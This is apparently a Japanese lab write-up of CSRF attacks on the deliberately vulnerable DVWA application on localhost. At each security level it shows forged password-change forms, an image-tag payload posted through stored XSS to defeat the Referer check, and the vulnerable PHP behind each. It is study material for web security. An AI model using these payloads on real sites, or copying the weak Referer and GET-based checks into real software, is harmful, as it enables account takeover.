# CSRF

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
<details>
<summary>Table of Contents</summary>

- [CSRF](#csrf)
  - [Low level](#low-level)
    - [実験結果](#実験結果)
    - [原因](#原因)
  - [Medium Level](#medium-level)
    - [実験結果](#実験結果-1)
    - [原因](#原因-1)
  - [High level](#high-level)
    - [実験結果](#実験結果-2)
    - [原因](#原因-2)

</details>
<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## Low level

### 実験結果

adminユーザでログインしている状態にしておく。

以下のHTML（[csrf.html](./csrf.html）を作成して、Formを送信する。

```html
<form action="http://localhost/vulnerabilities/csrf/" method="GET">
    New password:<br />
    <input type="password" AUTOCOMPLETE="on" name="password_new" value="attack"><br />
    Confirm new password:<br />
    <input type="password" AUTOCOMPLETE="on" name="password_conf"  value="attack"><br />
    <br />
    <input type="submit" value="Change" name="Change">
</form>
```

これで遷移した画面に 「Password Changed」と表示されるはずであり、ログアウトすると、以前のパスワードではログインできなくなっているはずである。

### 原因

該当のソースコードは以下になる。

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

原因としては上記を見ればわかるように GET リクエストのクエリ文字列に対して、送信元に対する検証処理を何も対処していないため、異なるOriginからのフォーム送信でもパスワードを変更できてしまうことである。

## Medium Level

### 実験結果

DVWAの XSS（Stored）にアクセスして、Name を入力する欄の入力文字数制限を1000程度に改変して、以下を入力する。

```html
<img src="/vulnerabilities/csrf/?password_new=attack&password_conf=attack&Change=Change#">
```

Message には何か適当にコメントを追加しておく。

これで 「Sign Guestbook」を実行して、ログアウトすると以前のパスワードではログインできない状態になってしまっている。

### 原因

該当するソースコードは以下になる。

```php

<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

上記のコードでは、`stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false` によってサーバに送信されたHTTPリクエストのRefererに格納されている値から、サーバ名称の名称が含まれているのかを大文字小文字を区別せずに判定している。

つまり XSS によって悪意のあるURLやスクリプトの送信元自体をサーバ側にしてしまえば、後は 攻撃者が設定したURLを投稿し、リクエストが発行されることで CSRF を実行することが可能となる。

## High level

### 実験結果

あくまでもユーザに発行されたトークンを盗み出せる状況であると想定する。

adminユーザでログインしている状態にし、CSRFを実験するページに遷移する。

以下のHTML（[csrf.html](./csrf-token.html）を作成して、Formを送信する。

```html
<form action="http://localhost/vulnerabilities/csrf/" method="GET">
    New password:<br />
    <input type="password" AUTOCOMPLETE="on" name="password_new" value="attack"><br />
    Confirm new password:<br />
    <input type="password" AUTOCOMPLETE="on" name="password_conf"  value="attack"><br />
    <br />
    <input type="submit" value="Change" name="Change">
    <input type="hidden" name="user_token" value="7e4b667165ee002a2fa9955630e93032">
</form>
```

これで遷移した画面に 「Password Changed」と表示されるはずであり、ログアウトすると、以前のパスワードではログインできなくなっているはずである。


### 原因

該当するソースコードは以下になる。

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```



